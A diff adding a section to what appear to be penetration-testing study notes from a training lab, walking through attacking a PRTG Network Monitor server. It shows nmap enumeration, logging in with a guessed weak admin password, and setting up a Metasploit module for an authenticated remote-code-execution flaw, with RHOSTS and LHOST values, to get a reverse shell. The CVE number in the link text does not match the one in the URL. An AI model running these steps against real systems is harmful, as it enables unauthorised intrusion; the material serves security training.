@@ -27,6 +27,11 @@ This document outlines common techniques for identifying and exploiting vulnerab
   - [Infrastructure/Network Monitoring](#infrastructurenetwork-monitoring)
     - [Splunk - Discovery and Enumeration](#splunk---discovery-and-enumeration)
     - [Attacking Splunk](#attacking-splunk)
+    - [PRTG Network Monitor](#prtg-network-monitor)
+
+  - [Customer Service Management and Configuration Management](#customer-service-management-and-configuration-management)
+    - [osTicket](#osticket)
+
 ---
 
 ## Overview
@@ -1218,3 +1223,87 @@ As soon as the application is uploaded, Splunk executes the scripted input, trig
 ![Filtered output](images/splunk9.PNG)
 
 ---
+
+### PRTG Network Monitor
+
+**P**RTG Network Monitor** is an agentless network monitoring solution used to track bandwidth usage, uptime, and performance metrics across a wide range of devices, including routers, switches, servers, and virtual infrastructure.
+
+PRTG performs **automatic network discovery**, scanning defined network ranges and building a device inventory. Once devices are identified, PRTG collects data using protocols such as:
+
+- ICMP
+- SNMP
+- WMI
+- NetFlow
+- REST API communication
+
+The management interface is delivered through an **AJAX-based web application**, with optional desktop clients for Windows, Linux, and macOS.
+
+PRTG commonly runs on standard web ports such as `80`, `443`, or `8080`. It can often be identified through service enumeration with `nmap`:
+
+```bash
+sudo nmap -p- --open -sV 10.129.201.50
+```
+
+In this case, PRTG was discovered running on port `8080`, and the service banner clearly identified the application and version:
+
+```
+8080/tcp  open  http  Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+```
+
+![Filtered output](images/prtg.PNG)
+
+PRTG ships with default administrative credentials:
+
+```
+prtgadmin:prtgadmin
+```
+
+![Filtered output](images/prtg2.PNG)
+
+
+Authentication with the default credentials failed. However, after testing common weak passwords, administrative access was obtained using:
+
+```
+prtgadmin:Password123
+```
+
+![Filtered output](images/prtg3.PNG)
+
+Once administrative access is confirmed, known vulnerabilities can be leveraged. Searching `Metasploit` reveals several PRTG-related modules:
+
+```
+msfconsole
+search prtg
+```
+
+![Filtered output](images/prtg4.PNG)
+
+```
+info 3
+```
+
+Module 3 is particularly relevant. It targets [CVE-2018-9275](https://nvd.nist.gov/vuln/detail/CVE-2018-9276), an authenticated remote code execution vulnerability affecting PRTG versions prior to `18.2.39`. The target is running version `18.1.37.13946`, which is vulnerable.
+
+This vulnerability allows an authenticated administrator to execute arbitrary commands on the PRTG server, typically running with `SYSTEM` privileges on Windows.
+
+Configure the exploit as follows:
+
+```
+set ADMIN_PASSWORD Password123
+set RHOSTS 10.129.74.252
+set RPORT 8080
+set LHOST 10.10.15.4
+exploit
+```
+
+![Filtered output](images/prtg5.PNG)
+
+The exploit succeeds, yielding a reverse shell on the target system:
+
+![Filtered output](images/prtg6.PNG)
+
+---
+
+## Customer Service Management and Configuration Management
+
+### osTicket
